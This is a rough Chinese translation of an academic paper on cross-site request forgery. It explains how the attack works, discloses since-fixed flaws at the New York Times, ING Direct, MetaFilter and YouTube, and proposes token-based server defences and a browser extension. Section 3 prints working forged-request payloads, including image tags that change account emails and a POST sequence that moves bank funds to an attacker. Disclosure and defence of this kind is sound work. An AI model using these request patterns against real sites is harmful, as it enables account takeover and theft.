# Cross-Site Request Forgeries: Exploitation and Prevention
## 跨站点请求伪造：开发和预防
William Zeller* and Edward W. Felten*†  
*Department of Computer Science  
*Center for Information Technology Policy  
†Woodrow Wilson School of Public and International Affairs
Princeton University  
fwzeller,felteng@cs.princeton.edu

修订10/15/2008：注意到“纽约时报”已经修复了下面所述的漏洞。 另外澄清了我们的服务器端CSRF保护建议并不能阻止[17]中描述的主动网络攻击。  
本文的最新版本可以在这里找到  
http://citp.princeton.edu/csrf/

### 摘要  
跨站点请求伪造（CSRF）攻击发生在恶意网站导致用户的Web浏览器对受信任站点执行不必要的操作时。这些攻击被称为基于Web的漏洞的“睡眠巨人”，因为互联网上的许多站点都不能对其进行保护，因为它们在很大程度上被Web开发和安全社区忽视。我们提出了四个严重的CSRF漏洞在四个主要网站上发现，包括我们认为是首次发布的涉及金融机构的攻击。这些漏洞允许攻击者从用户银行帐户中转账，获得用户电子邮件地址，侵犯用户隐私和妥协用户帐户。我们推荐能够完全保护站点免受CSRF攻击的服务器端更改（我们已经实现的）。我们还描述了服务器端解决方案应该具有的功能（缺少这些功能导致CSRF保护不必要地破坏了典型的Web浏览行为）。此外，我们还实施了一个客户端浏览器插件，即使站点没有采取措施保护自身，也可以保护用户免受某些类型的CSRF攻击。我们希望提高CSRF攻击的意识，同时向负责的Web开发人员提供保护用户免受这些攻击的工具。

### 1.简介  

跨站点请求伪造(1)（CSRF）攻击发生在恶意网站导致用户的Web浏览器对受信任站点执行不必要的操作时。 这些攻击被称为基于Web的漏洞的“睡眠巨人”[23]，因为互联网上的许多站点都不能对其进行保护，因为它们在很大程度上被Web开发和安全社区忽视。 CSRF攻击不会出现在Web Security Threat Classification[12]中，很少在学术或技术文献中进行讨论.(2)CSRF攻击简单易于诊断，易于开发，易于修复。它们存在是因为Web开发人员对于CSRF攻击的原因和严重性没有受过教育。 Web开发人员也可能会受到错误的印象，即针对更好的跨站脚本（XSS）问题的防御也可以防范CSRF攻击。

在第3节中，我们介绍了四个主要站点发现的四个严重的CSRF漏洞。 这些漏洞允许攻击者从用户银行帐户中转账，收获用户电子邮件地址，侵犯用户隐私和妥协用户帐户。


 
> (1) 跨站点请求伪造攻击也称为跨站点参考伪造，XSRF，会话骑乘和混淆副攻击。我们使用术语CSRF，因为它似乎是这种攻击最常用的术语。  
> (2) 在ACM数字图书馆搜索“跨站脚本”（与CSRF不同）返回72篇论文，搜索“xsrf OR csrf”只返回四篇论文。 在Safari Books Online上搜索“xss”（收集了4752本技术书籍），该书出现在96本书中，而“csrf OR xsrf”只出现在13本书中。



  
  



在第4.1节中，我们建议可以完全保护站点免受CSRF攻击的服务器端更改（我们已经实施）。这些建议具有优于先前提出的解决方案的优点，因为它们不需要服务器状态，并且不会破坏典型的Web浏览行为此外，我们实施了一个客户端浏览器插件，可以保护用户免受某些类型的CSRF攻击（第4.2节）。服务器端保护允许站点完全保护自己免受CSRF攻击，而客户端保护允许用户采取主动措施来保护自身免受许多类型的CSRF攻击，即使站点没有采取措施保护自身。我们希望提高CSRF攻击的意识，同时向负责的Web开发人员提供保护用户免受这些攻击的工具。

### 2.CSRF概述  

图1，图2和图3显示了CSRF攻击是如何工作的。  
下面我们使用一个具体的例子更详细地描述CSRF攻击。  

#### 2.1一个例子  

让我们考虑一个容易遭受CSRF攻击的网站的假设例子。该网站是一个基于网络的电子邮件网站，允许用户发送和接收电子邮件。该站点使用隐式身份验证（见第2.2节）来验证其用户。一个页面  `http://example.com/compose.htm` 包含一个HTML表单，允许用户输入收件人的电子邮件地址，主题和消息以及一个“发送电子邮件”按钮。

```
<form action="http://example.com/send_email.htm" method="GET">  
Recipient’s Email address: <input type="text" name="to">  
Subject: <input type="text" name="subject">  
Message: <textarea name="msg"></textarea>
<input type="submit" value="Send Email">
</form>
```

当`example.com`的用户点击“发送电子邮件”时，他输入的数据将作为GET请求发送到  `http://example.com/send_email.htm` 。由于GET请求只需将表单数据附加到URL，用户将被发送到以下URL（假设他输入“bob@example.com”作为收件人，“hello”作为主题，“该提案的状态如何？”作为消息）：
```
http://example.com/send_email.htm?to=bob%40example.com&subject=hello&msg=What%27s+the+status+of+that+proposal%3F (3)
```

 
> (3) URL数据编码，将@转换成％40等等



发送`email.htm`的页面将收到它收到的数据，并从用户发送电子邮件给收件人。注意，发送`email.htm`只需要获取数据并对该数据执行操作。它不在乎发出请求的位置，只有请求已经出现。这意味着，如果用户手动将上述URL输入到浏览器中，则`example.com`仍然会发送电子邮件。例如，如果用户在浏览器中输入以下三个URL，则发送`email.htm`将发送三封电子邮件（每个邮件给Bob，Alice和Carol）：

```
http://example.com/send_email.htm?to=bob%40example.com&subject=hi+Bob&msg=test
http://example.com/send_email.htm?to=alice%40example.com&subject=hi+Alice&msg=test
http://example.com/send_email.htm?to=carol%40example.com&subject=hi+Carol&msg=test
```

在这里可能发生CSRF攻击，因为`send email.htm`会接收到任何数据，并发送电子邮件。它不会验证数据源自`compose.htm`上的表单。因此，如果攻击者可以使用用户`send_email.htm`的请求，则该页面将导致`example.com`代表包含攻击者选择的任何数据的用户发送电子邮件，并且攻击者将成功执行CSRF攻击。



为了利用此漏洞，攻击者需要强制用户的浏览器发送`send_email.htm`的请求，以执行一些恶意的操作。（我们假设用户访问攻击者控制的站点，目标站点不会防御CSRF攻击）。具体来说，攻击者需要从他的站点到`example.com`建立一个跨站点请求。不幸的是，HTML提供了许多方法来提出这样的请求。例如，\<img\>标签将导致浏览器加载任何设置为src属性的URI，即使该URI不是图像（因为浏览器只能在加载URI后才能告诉URI是一个图像）。攻击者可以使用以下代码创建一个页面：

```
<img src="http://example.com/send_email.htm?
to=mallory%40example.com&subject=Hi&msg=My+email+address+has+been+stolen">
```

当用户访问该页面时，将发送请求`send_email.htm`，然后将从用户向Mallory发送电子邮件。这个例子与我们在“纽约时报”网站上发现的实际漏洞几乎相同，我们在3.1节中介绍。  

攻击者可能会导致用户浏览器对其他站点执行不必要的操作时，CSRF攻击成功。要使此操作成功，用户必须能够执行此操作。CSRF攻击通常与用户一样强大，意味着用户可以执行的任何操作也可以由攻击者使用CSRF攻击执行。因此，网站给用户的力量越大，可能的CSRF攻击就越严重。  

几乎每个使用隐式认证的站点都可以成功实施CSRF攻击（见第2.2节），并且没有明确地保护自己免受CSRF攻击。  

同源策略（见附录B）旨在防止攻击者访问第三方站点上的数据。此策略不会阻止发送请求，它只能防止从第三方服务器返回的数据读取的攻击。由于CSRF攻击是发送请求的结果，所以同源策略不会防止CSRF攻击。


![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/1_cn.png)  

图1：这里，Web浏览器已建立与受信任站点的认证会话。 只有当Web浏览器通过授权会话发出请求时，才能执行“可信操作”。

![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/2_cn.png)  
图2：有效请求。 网络浏览器尝试执行受信任的操作。 受信任的站点确认Web浏览器已通过身份验证，并允许执行该操作。

![image](https://github.com/guangguang831/ns/blob/master/2017-2/%E5%A4%A7%E4%BD%9C%E4%B8%9A/3_cn.png)  
图3：CSRF攻击。攻击网站导致浏览器向受信任的站点发送请求。受信任的站点从Web浏览器看到一个有效的经过身份验证的请求，并执行“可信任操作”。 CSRF攻击是可能的，因为网站认证Web浏览器，而不是用户。

#### 2.2认证和CSRF  

CSRF攻击经常利用目标网站的认证机制。问题的根源在于，Web身份验证通常保证来自某个用户浏览器的请求的站点;但不能确保用户实际请求或授权请求。  

例如，假设Alice访问目标站点T.T给Alice的浏览器一个包含伪随机会话标识符sid的cookie，以跟踪她的会话。Alice被要求登录到该站点，并在输入有效的用户名和密码后，该站点记录了Alice登录到会话sid的事实。当Alice向T发送请求时，她的浏览器会自动发送包含sid的会话cookie。T然后使用其记录将会话识别为来自Alice。现在假设Alice访问恶意网站M.由M提供的内容包含Javascript代码或导致Alice的浏览器向T发送HTTP请求的图像标签。由于请求将转到T，Alice的浏览器“有帮助”附加会话cookie sid要求。在查看请求时，T推测来自Cookie的请求来自Alice，所以T对Alice的帐户执行请求的操作。 这是一次成功的CSRF攻击。  

大多数其他Web认证机制也遇到同样的问题。例如，HTTP BasicAuth机制[22]将让爱丽丝告诉她的浏览器她的T的网站的用户名和密码，然后浏览器将“有帮助”地将用户名和密码附加到将来发送给T的请求。或者，T可能会使用客户端边SSL证书，但同样的问题会导致浏览器会“有帮助”地使用证书来向T的站点执行请求。类似地，如果T通过她的IP地址认证Alice，则CSRF攻击是可能的。 

一般来说，每当认证发生时，由于哪个站点发送了一个请求以及哪个浏览器来自哪里，那么就有一个CSRF攻击的危险。原则上，可以通过要求用户对发送到某个站点的每个请求采取明确的，不可扩展的操作（例如重新输入用户名和密码）来消除这种危险，但实际上这会导致主要的可用性问题。最标准和广泛使用的认证机制不能防止CSRF攻击，因此在其他地方必须寻求实际的解决方案。

#### 2.3 CSRF攻击载体  

要使攻击成功，用户必须登录到目标站点，并且必须访问攻击者的站点或攻击者部分控制的站点。 

如果服务器包含CSRF漏洞，并且接受GET请求（如上例所示），则可以在不使用JavaScript的情况下进行CSRF攻击（例如，可以使用简单的\<img\>标记）。 如果服务器只接受POST请求，则需要JavaScript才能将POST请求从攻击者的站点发送到目标站点。

#### 2.4 CSRF与XSS  

最近非常注意跨站脚本（XSS）[20]漏洞。当攻击者注入恶意代码（通常为JavaScript）转换为网站，目的是定位该网站的其他用户。例如，一个网站可能允许用户发表评论。这些注释由用户提交，存储在数据库中，并显示给该网站的所有未来用户。 如果攻击者能够在注释中输入恶意JavaScript，则JavaScript将嵌入到包含注释的任何页面上。当用户访问该站点时，攻击者的JavaScript将以目标站点的所有权限执行。嵌入到目标站点中的恶意JavaScript将能够发送和接收网站上任何页面的请求，并访问该站点设置的Cookie。从XSS攻击的保护措施需要网站仔细筛选任何用户输入，以确保不会注入恶意代码。 

CSRF和XSS攻击的不同之处在于XSS攻击需要JavaScript，而CSRF攻击则不需要。XSS攻击要求网站接受恶意代码，而使用CSRF攻击恶意代码位于第三方站点。 过滤用户输入将防止恶意代码在特定站点上运行，但不会阻止恶意代码在第三方站点上运行。 由于恶意代码可以在第三方站点上运行，所以防止XSS攻击不能保护站点免受CSRF攻击。如果一个站点容易遭受XSS攻击，那么它容易遭受CSRF攻击。 如果一个站点完全受到XSS攻击的保护，那么很可能仍然容易受到CSRF攻击。

### 3 .CSRF漏洞  

在本节中，我们描述了我们发现的四个漏洞。这些攻击是通过测量大约十个流行网站的列表来发现的。 我们分析的许多网站都有CSRF漏洞或漏洞的历史（例如，网页搜索将显示一个已经被修复的CSRF漏洞的报告）。事实上，这么多网站容易遭受CSRF攻击，直到第三方披露这些问题表明，许多网站管理员没有受到关于CSRF漏洞的风险和存在的教育。  
我们相信ING Direct，Metafilter和YouTube以及“纽约时报”已经纠正了我们下面描述的漏洞。 所有四个站点似乎已经使用类似于我们在4.1节中提出的方法来解决问题。


#### 3.1纽约时报（nytimes.com）  

> 纽约时报网站是“网络上第一大报纸网站”[10]。 

我们在`NYTimes.com`中发现了一个CSRF漏洞，使得用户的电子邮件地址可供攻击者使用。如果您是`NYTimes.com`会员，则可以使用此攻击来确定您的电子邮件地址，并使用它发送垃圾邮件或识别您。

这种攻击利用了`NYTimes.com`的“Email This”功能。“Email This”是一种工具，允许用户通过指定收件人的电子邮件地址和可选的个人消息发送链接到`NYTimes.com`文章。收件人收到一封类似于以下内容的电子邮件：  

该页面已通过以下方式发送给您：[用户的电子邮件地址]  
发件人的留言：  
你也许会对这个感兴趣。  
国内版  
研究人员寻找窃取加密数据的方法  
约翰•马克福夫 
一个计算机安全研究小组已经开发出一种从计算机硬盘窃取加密信息的方法。

要利用此漏洞，攻击者会导致登录用户的浏览器向 `NYTimes.com` “Email This”页面发送请求。接受“Email This”请求的页面不会防止CSRF攻击，因此用户的浏览器将会将请求发送到 `NYTimes.com` ，这将触发它发送电子邮件到攻击者选择的地址。如果攻击者将收件人电子邮件地址更改为他自己的电子邮件地址，他将收到包含用户电子邮件地址的 `NYTimes.com` 的电子邮件。

利用此漏洞非常简单。每个`NYTimes.com`上的文章包含指向“Email This”页面的链接，其中包含用户输入收件人电子邮件地址的表单。 此表单还包含每个文章唯一的隐藏变量。 这是一个示例形式：

```
<form 
action="http://www.nytimes.com/mem/emailthis.html"
method="POST"
enctype="application/x-www-form-urlencoded">
<input type="checkbox" id="copytoself" name="copytoself" value="Y">
<input id="recipients" name="recipients" type="text" maxlength="1320" value="">
<input type="hidden" name="state" value="1">
<textarea id="message" name="personalnote" maxlength="512"></textarea>
<input type="hidden" name="type" value="1">
<input type="hidden" name="url" value="[...]">
<input type="hidden" name="title" value="[...]">
<input type="hidden" name="description" value="[...]">
...
</form>
```


由于`NYTimes.com`不区分GET和POST请求，攻击者可以将此表单转换为GET请求，以后可以在\<img\>标记中使用。将表单转换为GET请求涉及将每个参数附加到URL的查询字符串（格式为NAME = VALUE，以＆符号分隔）。  

一旦攻击者构建了URL，他就可以将其设置为\<img\>标签的SRC属性。如果`NYTimes.com`的登录用户访问包含此\<img\>标签的任何页面，浏览器将使用攻击者的参数加载“Email This”页面，导致`NYTimes.com`向包含用户电子邮件的攻击者发送电子邮件地址。攻击者可以存储此电子邮件地址以供日后滥用（例如，为垃圾邮件发送），或使用电子邮件地址来识别他自己网站的访问者。这可能导致严重的隐私后果，例如允许有争议地点的运营商（例如政治或非法）识别其用户。  

我们在`Firefox 2.0.0.6`，`Opera 9.23` 和 `Safari 3.0.3（522.15.5）` 中验证了此次攻击。由于附录A中描述的原因，它在Internet Explorer中不起作用。我们在2007年9月通知了“纽约时报”这个漏洞。这是2008年10月1日修复的。

#### 3.2 ING Direct（ingdirect.com） 

> “ING DIRECT是美国第四大储蓄银行，拥有超过620亿美元的资产，为超过410万的客户提供卓越的储蓄和抵押贷款服务。”[15]  

我们在ING网站上发现了CSRF漏洞，允许攻击者代表用户打开更多帐户，并将资金从用户帐户转移到攻击者的帐户。正如我们在第2.2节中讨论的那样，ING使用SSL并不能阻止这种攻击。我们认为这是第一次发布涉及金融机构的CSRF攻击。

由于ING没有明确地防范CSRF攻击，因此从用户帐户转移资金就像模拟用户在转移资金时所采取的步骤一样简单。 这些步骤包括以下操作：
1.	攻击者代表用户创建一个支票账户。(4)


> (4) ING Direct允许以最初的金额即时创建支票账户。



（a）攻击者使用户的浏览器访问ING的“打开新帐户”页面：  
- 向 `https://secure.ingdirect.com/myaccount/INGDirect.html?command=gotoOpenOCA` 发送GET请求 

（b）攻击者导致用户的浏览器选择一个“单一”帐户：  
- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：  

```
command=ocaOpenInitial&YES, I 
WANT TO CONTINUE..x=44&YES, I 
WANT TO CONTINUE..y=25
```

（c）攻击者选择任意数量的资金从用户的储蓄账户转移到新的欺诈账户：  
- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
```
command=ocaValidateFunding&PRIMARY
CARD=true&JOINTCARD=true&Account
Nickname=[ACCOUNT NAME]&FROMACCT=
0&TAMT=[INITIAL AMOUNT]&YES, I
WANT TO CONTINUE..x=44&YES, I
WANT TO
CONTINUE..y=25&XTYPE=4000USD
&XBCRCD=USD
…其中[ACCOUNT NAME]是用户将看到的账户的名称，[INITIAL AMOUNT]是开户时转入新账户的金额。  
帐号名称可以是任何字符串，攻击者不需要知道它是一个简单的昵称，它将用于新帐户。
```
（d）攻击者使用户的浏览器点击最终的“开户”按钮，导致ING代表用户开立一个新的支票帐户：  
- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
```
command=ocaOpenAccount&Agree
ElectronicDisclosure=yes&AgreeTerms
Conditions=yes&YES, I WANT TO
CONTINUE..x=44&YES, I WANT TO
CONTINUE..y=25&YES, I WANT TO
CONTINUE.=Submit
```

2.攻击者将自己作为收款人添加到用户帐户中。 

（a）攻击者导致用户的浏览器访问ING的“添加人员”页面：  
- 向 `https://secure.ingdirect.com/myaccount/INGDirect.html?command=goToModifyPersonalPayee&Mode=Add&from=displayEmailMoney` 发送GET请求

（b）攻击者使用户的浏览器输入攻击者的信息：  
- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
```
command=validateModifyPersonalPayee
&from=displayEmailMoney&PayeeName
=[PAYEE NAME]&PayeeNickname=&chk
Email=on&PayeeEmail=[PAYEE EMAIL]
&PayeeIsEmailToOrange=true&Payee
OrangeAccount=[PAYEE ACCOUNT NUM]&
YES, I WANT TO CONTINUE..x=44
&YES, I WANT TO CONTINUE..y=25
…其中[PAYEE NAME]是攻击者的名字，[PAYEE EMAIL]是攻击者的电子邮件地址，[PAYEE ACCOUNT NUM]是攻击者的ING帐号。
```

（c）攻击者使用户的浏览器确认攻击者是有效的收款人：  
- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
```
command=modifyPersonalPayee&from=
displayEmailMoney&YES, I WANT TO
CONTINUE..x=44 &YES, I WANT TO
CONTINUE..y=25
```

3.攻击者将资金从用户账户转移到自己的账户。

（a）攻击者使用户的浏览器输入一笔钱发送给攻击者：
- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
```
command=validateEmailMoney&CNSPayID
=5000&Amount=[TRANSFER AMOUNT]
&Comments=[TRANSFER MESSAGE]&YES,
I WANT TO CONTINUE..x=44 &YES, I
WANT TO
CONTINUE..y=25&show=1&button=Send
Money
…其中[TRANSFER AMOUNT]是从用户账户转移到攻击者账户的金额，[TRANSFER MESSAGE]是包含在交易中的消息。
```

（b）攻击者使用户的浏览器确认应发送资金：
- 通过以下参数向 `https://secure.ingdirect.com/myaccount/INGDirect.html` 发送POST请求：
```
command=emailMoney&Amount=
[TRANSFER AMOUNT]Comments=
[TRANSFER MESSAGE]&YES, I WANT
TO CONTINUE..x=44&YES, I WANT TO
CONTINUE..y=25
…其中[TRANSFER AMOUNT]和[TRANSFER MESSAGE]与上面的3（a）相同。
```


为了利用这种攻击，攻击者可以创建一个页面，使用JavaScript连续发出上述POST请求。这对用户是不可见的。  

这种攻击假定用户没有将其他收款人添加到他的ING Direct支票账户。这次攻击很可能已经被修改，没有这个限制。  

我们在`Firefox 2.0.0.3`和`Internet Explorer 7.0.5`中验证了这一攻击。我们没有在其他浏览器中测试这种攻击。我们已经通知了ING这个漏洞，并已经修复。


#### 3.3 MetaFilter（metafilter.com） 

> “MetaFilter是一个博客...任何人都可以提供链接或评论。”目前每月有超过5万名用户和超过350万的独立访问者[1]。

我们在MetaFilter中发现了一个允许攻击者控制用户帐户的CSRF漏洞。  

MetaFilter有一个“丢失的密码”页面[6]，允许用户请求他的密码。输入用户名将导致MetaFilter将包含用户当前密码的电子邮件发送到与该用户关联的电子邮件地址。这意味着能够更改用户电子邮件地址的攻击者可以使用“丢失的密码”页面来接收用户的密码，并使用该密码来控制用户的帐户。

我们发现的CSRF攻击允许攻击者更改用户的电子邮件地址。 为了利用这种攻击，攻击者可以让用户的浏览器发送一个请求到用来更新用户配置文件的页面。 此页面接受用户的电子邮件地址作为参数，可以用攻击者的地址替换。一个示例攻击是嵌入在页面上的以下HTML：

```
<img src="
http://metafilter.com/contribute/customize_
action.cfm?user_email=[ATTACKER’S EMAIL]"/>
```

虽然这将改变任何登录用户的电子邮件地址，攻击者将不知道哪个用户的帐户被修改。攻击者可以通过利用另一个MetaFilter功能来发现这个功能，该功能允许用户将其他用户标记为“联系人”。攻击者可以使用与上述类似的CSRF，以使用户在不知情的情况下将攻击者添加到他的联系人列表中。  

我们在`Firefox 2.0.0.6`中验证了这个攻击。由于附录A中描述的原因，它在Internet Explorer中不起作用。我们没有在其他浏览器中测试此攻击。我们向MetaFilter报告了这个漏洞，并确认它在两天内得到修复。

#### 3.4 YouTube (youtube.com)  

> “YouTube是在线视频的领导者，也是通过Web体验观看和分享全球原创视频的首要目的地”[13]。 2006年6月的一项研究发现，“仅YouTube就占了所有HTTP流量的20％，即互联网上所有流量的近10％。”[14]

我们几乎在用户可以在YouTube上执行的所有操作中，都发现了CSRF漏洞。攻击者可能已经将视频添加到用户的“收藏夹”中，将自己添加到用户的“朋友”或“家人”列表中，以用户的名义发送任意消息，标记为不合适的视频，自动与用户的联系人共享视频，用户转到“频道”（由一个人或组发布的一组视频）并将视频添加到用户的“快速列表”（用户打算在稍后观看的视频列表）中。例如，要将视频添加到用户的“收藏夹”，攻击者只需将此\<img\>标签嵌入到任何网站：

```
<img src="http://youtube.com/watch_ajax?
action_add_favorite_playlist=1&video_
id=[VIDEO ID]&playlist_id=&add_to_favorite=
1&show=1&button=AddvideoasFavorite"/>
```

攻击者可能使用此漏洞影响视频的流行度。例如，将视频添加到足够数量的用户的“收藏”将导致YouTube在其“最受欢迎”（视频“最受欢迎”视频列表）中显示视频。除了增加视频的受欢迎程度，攻击者可能会导致用户在不知情的情况下将视频标记为不适当的内容，试图使YouTube将其从网站中删除。

这些攻击也可能被用来侵犯用户的隐私。YouTube允许用户只将视频提供给朋友或家人。这些攻击可能允许攻击者自动将自己添加到用户的“朋友”或“家庭”列表，这将允许他访问由用户上传并限制到这些列表的任何私人视频。

攻击者可能已经与用户的整个联系人列表（“朋友”，“家人”等）共享一个视频。“共享”仅仅意味着发送一个链接到一个视频附带一个可选的消息。该消息可以包含一个链接，这意味着攻击者可以强制用户包含一个链接到包含攻击的网站。接收到该消息的用户可能会点击该链接，从而使得攻击以病毒传播。  

我们在`Firefox 2.0.0.6`中验证了这些攻击。由于附录A中描述的原因，它们在Internet Explorer中不工作。我们没有在其他浏览器中测试这些攻击。我们将这些漏洞报告给YouTube，并且似乎已经得到更正。

### 4防止CSRF

我们创建了两个工具来保护大量的用户免受CSRF攻击。第一个是服务器端工具，可以完全保护潜在的目标站点免受CSRF攻击。第二个是客户端工具，可以保护用户免受某些类型的CSRF攻击。表1描述了用户何时受到这些不同技术的保护。我们还推荐应该成为服务器端解决方案一部分的功能。这些建议比先前提出的解决方案具有优势，因为它们不需要服务器状态并且不会破坏典型的网页浏览行为。


---|不受保护的用户 | 使用我们的Firefox 插件的用户
---|---|---
没有保护的目标服务器 | 不受保护 | 不受保护
只接受POST请求的目标服务器|不受保护 | 受保护
使用服务器端保护的目标服务器|受保护   | 受保护
	
表1：用户保护  
此表显示用户何时不受CSRF攻击保护。我们的服务器端建议保护站点的每个用户。 当服务器要求使用POST请求时，我们的客户端浏览器插件保护用户。

#### 4.1服务器端保护

注意：我们在下面假设敌手不能修改与目标站点相关的用户的Cookie。除非攻击者是一个活跃的网络攻击者，否则相同的原始策略保证是这种情况。下面的解决方案不能防止活跃的网络攻击者（详见[17]）。  

最近，已经引入了许多框架来简化各种语言的网页开发。例子包括`Code Igniter [4]（PHP）`，`Ruby on Rails [8]（Ruby）`，`django [5]（Python）`，`Catalyst [3]（Perl）`和`Struts [9]（Java）`。这些框架的一个主要好处是可以直接在框架中构建CSRF保护，保护开发人员，同时使他们免于自行实施保护。在框架层面实施的CSRF保护将受到更大的监督，由于疏忽或对CSRF的误解而引入错误的可能性较低。
  
个别站点和框架可以通过采取以下防范措施来保护自己免受CSRF攻击： 

1.允许GET请求只检索数据，不能修改服务器上的任何数据此更改使用\<img\>标签或其他类型的GET请求来保护站点免受CSRF攻击。另外，这个建议遵循RFC 2616（HTTP / 1.1）：
  
特别是，已经确定GET和HEAD方法不应该具有采取除了检索之外的其他行为的意义。这些方法应该被认为是“安全的”[21]。
虽然这种保护措施本身并不能阻止CSRF（因为攻击者可以使用POST请求），但它可以与（2）结合起来，以完全防止CSRF漏洞(5)。


> (5)我们假设对手不能修改用户的cookies



2.要求所有POST请求包含一个伪随机值

当用户访问一个网站时，网站应该生成一个（强加密型）伪随机值，并将其设置为用户机器上的一个cookie。 该网站应该要求每个表单提交包括这个伪随机值作为一个表单值，也作为一个cookie值。 当POST请求发送到站点时，如果表单值和cookie值相同，则只能将该请求视为有效。当攻击者代表用户提交表单时，他只能修改表单的值。攻击者无法读取从服务器发送的任何数据或根据同源策略修改cookie值（请参阅附录B）。这意味着攻击者可以用表单发送任何他想要的值，但他将无法修改或读取存储在cookie中的值。由于cookie值和表单值必须相同，攻击者将无法成功提交表单，除非他能够猜测伪随机值。

3.使用独立于用户帐户的伪随机值 

连接到用户帐户的伪随机值无法防止[17]中描述的“登录CSRF”攻击。

这种服务器端保护形式具有以下特点：

- 	轻巧。该解决方案不需要服务器端状态。该网站的唯一责任是生成伪随机值（如果当前不存在），并在发出POST请求时比较两个值，从而使这种形式的CSRF保护计算成本低廉。
- 	
-   并行会话兼容。如果用户在网站上打开两种不同的表单，CSRF保护不应阻止他成功提交这两种表单。考虑一下，如果网站在每次载入表单时生成一个伪随机值，将会覆盖旧的伪随机值。用户只能成功提交他打开的最后一个表单，因为所有其他表单都将包含无效的伪随机值。必须小心确保CSRF保护不会中断使用多个浏览器窗口的选项卡式浏览或浏览网站。此解决方案通过设置一个站点范围内的cookie，并在一定时间内为所有表单使用相同的cookie来防止此问题。  



-   身份验证不可知。此解决方案不要求使用特定类型的身份验证。它可以与使用Cookie会话，HTTP身份验证，SSL身份验证或IP地址的站点协同工作以验证用户身份。

之前已经提出了在表单中使用伪随机值，但是许多提出的实现不具有上述特征。 例如，Johns和Winter [24]和Schreiber [27]需要服务器状态，而Shiflett [28]则打破了标签浏览。 据我们所知，以前提出的解决方案没有强调使用典型浏览行为的重要性。  
任何拦截POST请求和“包装”命令来生成\<form\>标记的框架都可以透明地将上述CSRF保护构建到框架中。例如，如果框架需要开发者调用函数open（...）; 为了生成一个\<form ...\>标签，可以修改框架，以便每次创建表单时自动生成伪随机值：

```
<form ...>
<input type="hidden" name="csrf value"
value="8dcb5e56904d9b7d4bbf333afdd154ca">
```

此外，框架可以处理设置关联的cookie值，并将提交的值与cookie值进行比较。如果一个框架增加了这种CSRF保护，那么框架的所有用户都将受到保护，免受CSRF攻击。由于这种CSRF保护对于框架或开发人员可能提供的任何身份验证方法来说都是轻量级和不可知的，所以我们强烈建议拦截POST请求并提供生成\<form\>标记的函数的框架实现这种CSRF保护并将其打开默认。如果（例如）他们自己实施了CSRF保护，或者他们不想要cookies，框架应该为开发者提供禁用这种保护的能力。

我们为Code Igniter框架提供了这样一个插件。插件不需要开发者修改任何现有的表单，并且会拦截（并验证POST请求的伪随机值）以及创建\<form\>标签的函数调用。虽然这需要开发人员的干预（Code Igniter没有执行AJAX请求的标准方法），但该插件还提供了一个允许将CSRF令牌添加到AJAX请求的功能。该插件可以从我们的网站下载(6)。





> (6)我们的Code Ignite插件：http://www.cs.princeton.edu/~wzeller/csrf/ci/




#### 4.2客户端保护

由于Web浏览器发送了允许攻击者成功执行CSRF攻击的请求，因此可以创建客户端工具来保护用户免受这些攻击。一个现有的工具RequestRodeo [24]作为客户端和服务器之间的代理。如果RequestRodeo看到一个它认为无效的请求，它将从请求中去除认证信息。虽然这在很多情况下都有效，但是有一些限制。具体来说，当使用客户端SSL认证或使用JavaScript来生成页面的一部分（因为RequestRodeo在数据通过代理时并且在浏览器显示之前分析数据），它将不起作用。

我们开发了一个浏览器插件，可以保护用户免受特定类型的CSRF攻击，克服了上述限制。 我们使用我们的工具作为Firefox浏览器的扩展。 用户需要下载并安装这个扩展，才能有效地抵抗CSRF攻击。

我们的扩展通过拦截每个HTTP请求并决定是否允许。这个决定是使用以下规则进行的。 首先，任何不是POST请求的请求都是允许的。其次，如果请求网站和目标网站属于同源策略（见附录B），则允许请求。第三，如果允许请求站点使用Adobe的跨域策略向目标站点发出请求（请参阅附录B），则允许请求。如果我们的扩展拒绝了一个请求，扩展会通过一个熟悉的界面（与Firefox的弹出窗口阻止程序使用的界面相同）向用户发出警告，并向用户提供将该站点添加到白名单的选项。

我们的扩展只拦截POST请求。这意味着我们的扩展不会保护用户免受使用GET请求的CSRF攻击。 防止这种类型的攻击的唯一方法是，不允许跨域GET请求，或允许用户一次只登录一个站点，限制用户可能会发现过度负担。

这个Firefox扩展可以在我们的网站上下载（7）。


> （7）我们的CSRF Firefox插件：http://www.cs.princeton.edu/~wzeller/csrf/protector/

#### 5相关工作
接受CSRF攻击的主要原因是OmniTI的Chris Shiflett [28]和WhiteHat Security的Jeremiah Grossman [23]的工作。 Burns [19]和Schreiber [27]对CSRF攻击提供了全面的介绍，但是没有描述工作中的漏洞.Johns和Winter[24]描述了RequestRodeo，一种客户端防止使用HTTP代理的CSRF攻击。 这种方法有一些限制，他们描述了一个类似于我们的浏览器插件作为未来可能的工作。他们在[25]中通过实施有限的本地网络扩展了这项工作，防止CSRF攻击本地资源。

存在与我们的建议类似的服务器端保护，但缺乏标准要求已经造成了不必要的问题。如前所述，Johns、Winter [24]和Schreiber[27]要求服务器状态，而Shiflett[28]则打破标签浏览。Jovanovic等人[26]通过在Web服务器和Web应用程序之间添加代理，创建了一种通过CSRF保护来改进传统应用程序的方法。这些保护要求对所有数据进行缓冲，并对应用程序中的链接进行修改。它们还要求重写某些应用程序调用。当原生应用程序不能被重写时，该解决方案是有效的，但不如直接向应用程序添加CSRF保护那样有效。这个解决方案针对那些希望保护其服务器上的应用程序免受CSRF攻击的管理员，而我们的解决方案针对的是那些希望将CSRF保护直接添加到他们的程序中的Web应用程序和框架开发人员。



#### 6未来的工作

鉴于CSRF漏洞的普遍性，一个自动化的方法来扫描这些问题将是非常有用的。Bortz和Boneh[18]描述了跨站点时间攻击，并建议将它们与CSRF攻击相结合，以进一步危害用户的隐私。

我们的客户端浏览器插件是一个Firefox扩展，仅适用于Firefox。可以为其他浏览器编写类似的插件。 同样，我们的CodeIgniter扩展使用的服务器端方法可以很容易地在其他框架中实现。

